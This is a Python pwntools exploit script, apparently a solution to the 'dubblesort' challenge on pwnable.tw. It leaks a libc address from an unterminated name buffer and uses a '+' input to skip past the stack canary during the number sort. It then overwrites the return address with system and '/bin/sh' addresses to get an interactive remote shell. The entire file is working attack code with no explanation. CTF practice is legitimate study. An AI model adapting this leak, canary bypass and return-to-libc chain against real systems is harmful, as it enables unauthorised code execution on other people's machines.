#!/usr/bin/env python

from pwn import *

context.update(log_level='debug', arch='i386', os='linux')

#p = process('./dubblesort')
p = remote('chall.pwnable.tw', 10101)

p.sendafter('What your name :', 'A' * 24 + '\n')
buf = p.recv(1024)
addr_libc_gotplt = (ord(buf[0x21]) << 24) + (ord(buf[0x20]) << 16) + (ord(buf[0x1f]) << 8)

#remote
addr_libc = addr_libc_gotplt - 0x1b0000
addr_system = addr_libc + 0x3a940
addr_binsh = addr_libc + 0x158e8b

#local
#addr_system = addr_libc + 0x3ada0
#addr_libc = addr_libc_gotplt - 0x1b2000
#addr_binsh = addr_libc + 0x15ba0b

log.success('libc_gotplt_addr = ' + str(addr_libc_gotplt) + ':' + hex(addr_libc_gotplt))
log.success('addr_libc = ' + str(addr_libc) + ':' + hex(addr_libc))
log.success('addr_system = ' + str(addr_system) + ':' + hex(addr_system))
log.success('addr_binsh = ' + str(addr_binsh) + ':' + hex(addr_binsh))

p.send('35\n')

for i in range(0, 35):
    p.recvuntil('number : ')
    if i < 24:
        p.send('0\n')
    elif i == 24:
        p.send('+\n')
    elif i > 24 and i <= 32:
        p.send(str(addr_system) + '\n')
    else:
        p.send(str(addr_binsh) + '\n')

p.interactive()
